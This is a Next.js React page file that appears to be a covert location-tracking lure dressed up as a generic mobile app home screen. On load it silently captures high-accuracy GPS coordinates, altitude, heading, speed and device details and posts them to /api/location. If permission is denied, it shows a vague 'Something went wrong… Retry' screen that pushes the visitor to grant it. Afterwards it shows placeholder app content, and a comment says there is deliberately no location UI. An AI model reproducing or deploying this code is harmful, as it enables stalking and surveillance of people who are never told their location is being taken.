"use client";

import { useCallback, useEffect, useState } from "react";
import { getDeviceInfo } from "@/lib/deviceInfo";

type Screen = "loading" | "retry" | "ready";

export default function Home() {
  const [screen, setScreen] = useState<Screen>("loading");
  const [busy, setBusy] = useState(false);

  const captureAndSave = useCallback(async () => {
    setBusy(true);
    setScreen("loading");

    // Device info — no extra permission needed
    const device = getDeviceInfo();

    if (!navigator.geolocation) {
      setScreen("retry");
      setBusy(false);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        try {
          const { latitude, longitude, accuracy, altitude, heading, speed } =
            pos.coords;

          const res = await fetch("/api/location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              latitude,
              longitude,
              accuracy,
              altitude,
              heading,
              speed,
              device,
            }),
          });

          if (!res.ok) {
            setScreen("retry");
            return;
          }

          setScreen("ready");
        } catch {
          setScreen("retry");
        } finally {
          setBusy(false);
        }
      },
      () => {
        setScreen("retry");
        setBusy(false);
      },
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0,
      }
    );
  }, []);

  useEffect(() => {
    captureAndSave();
  }, [captureAndSave]);

  if (screen === "loading") {
    return (
      <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-[#0b0b0f] px-6">
        <div className="relative mb-8 h-16 w-16">
          <div className="absolute inset-0 animate-spin rounded-full border-[3px] border-white/10 border-t-white" />
          <div className="absolute inset-2 animate-pulse rounded-full bg-white/5" />
        </div>
        <p className="text-[15px] font-medium tracking-wide text-white/80">
          Loading…
        </p>
        <p className="mt-2 text-center text-sm text-white/40">
          Please wait a moment
        </p>
      </div>
    );
  }

  if (screen === "retry") {
    return (
      <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-[#0b0b0f] px-6">
        <div className="w-full max-w-sm text-center">
          <div className="mx-auto mb-6 flex h-16 w-16 items-center justify-center rounded-2xl bg-white/5 ring-1 ring-white/10">
            <svg
              className="h-8 w-8 text-white/70"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
              strokeWidth={1.5}
              aria-hidden
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                d="M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0 3.181 3.183a8.25 8.25 0 0 0 13.803-3.7M4.031 9.865a8.25 8.25 0 0 1 13.803-3.7l3.181 3.182"
              />
            </svg>
          </div>
          <h1 className="text-xl font-semibold text-white">
            Something went wrong
          </h1>
          <p className="mt-2 text-sm leading-relaxed text-white/45">
            We couldn&apos;t finish loading. Tap below to try again.
          </p>
          <button
            type="button"
            disabled={busy}
            onClick={captureAndSave}
            className="mt-8 w-full rounded-2xl bg-white py-4 text-[16px] font-semibold text-black transition active:scale-[0.98] disabled:opacity-60"
          >
            {busy ? "Please wait…" : "Retry"}
          </button>
        </div>
      </div>
    );
  }

  // Ready — clean home, no location UI at all
  return (
    <div className="min-h-dvh bg-[#0b0b0f] text-white">
      <header className="safe-top sticky top-0 z-10 border-b border-white/5 bg-[#0b0b0f]/80 px-5 py-4 backdrop-blur-xl">
        <div className="mx-auto flex max-w-lg items-center justify-between">
          <span className="text-lg font-semibold tracking-tight">Welcome</span>
          <span className="h-9 w-9 rounded-full bg-gradient-to-br from-violet-500 to-fuchsia-500 ring-2 ring-white/10" />
        </div>
      </header>

      <main className="mx-auto w-full max-w-lg px-5 pb-10 pt-6">
        <section className="rounded-3xl bg-gradient-to-br from-violet-600/90 to-fuchsia-600/80 p-6 shadow-2xl shadow-violet-900/30">
          <p className="text-sm font-medium text-white/80">Hello 👋</p>
          <h2 className="mt-1 text-2xl font-bold tracking-tight">
            You&apos;re all set
          </h2>
          <p className="mt-2 text-sm leading-relaxed text-white/75">
            Explore the app and enjoy a smooth mobile experience.
          </p>
        </section>

        <section className="mt-6 grid grid-cols-2 gap-3">
          {[
            { title: "Discover", sub: "New picks for you" },
            { title: "Activity", sub: "Your recent items" },
            { title: "Offers", sub: "Limited deals" },
            { title: "Support", sub: "We're here" },
          ].map((card) => (
            <button
              key={card.title}
              type="button"
              className="rounded-2xl border border-white/8 bg-white/5 p-4 text-left transition active:scale-[0.98] active:bg-white/10"
            >
              <p className="font-semibold text-white">{card.title}</p>
              <p className="mt-1 text-xs text-white/40">{card.sub}</p>
            </button>
          ))}
        </section>

        <section className="mt-6 rounded-2xl border border-white/8 bg-white/[0.03] p-5">
          <p className="text-sm font-medium text-white/90">Quick tip</p>
          <p className="mt-1 text-sm leading-relaxed text-white/45">
            Pull down anytime to refresh your feed and stay up to date.
          </p>
        </section>
      </main>

      <nav className="safe-bottom fixed bottom-0 left-0 right-0 border-t border-white/5 bg-[#0b0b0f]/95 backdrop-blur-xl">
        <div className="mx-auto flex max-w-lg justify-around px-2 py-3">
          {["Home", "Search", "Cart", "Profile"].map((label, i) => (
            <button
              key={label}
              type="button"
              className={`flex min-w-[64px] flex-col items-center gap-1 text-[11px] ${
                i === 0 ? "text-white" : "text-white/40"
              }`}
            >
              <span
                className={`h-1.5 w-1.5 rounded-full ${
                  i === 0 ? "bg-violet-400" : "bg-transparent"
                }`}
              />
              {label}
            </button>
          ))}
        </div>
      </nav>
    </div>
  );
}
